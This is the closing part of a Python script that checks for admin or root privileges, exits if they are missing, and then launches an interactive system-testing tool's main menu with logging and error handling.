        logger.debug("Checking for admin/root privileges")
        import platform
        is_admin = False
        if platform.system() == 'Windows':
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            import os
            is_admin = os.geteuid() == 0
            
        if not is_admin:
            logger.warning("Script running without admin/root privileges")
            print("\033[91m[!] This script requires admin/root privileges. Please run with elevated permissions.\033[0m")
            sys.exit(1)
    except Exception as e:
        logger.error(f"Error checking admin status: {e}", exc_info=True)
        print(f"\033[93m[!] Could not determine admin status: {e}. Proceeding anyway.\033[0m")
        
    try:
        logger.info("Creating and starting Interactive System Tester")
        tester = InteractiveSystemTester()
        tester.main_menu()
    except Exception as e:
        logger.critical(f"Unhandled exception in main application: {e}", exc_info=True)
        print(f"\033[91m[!] A critical error occurred: {e}\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()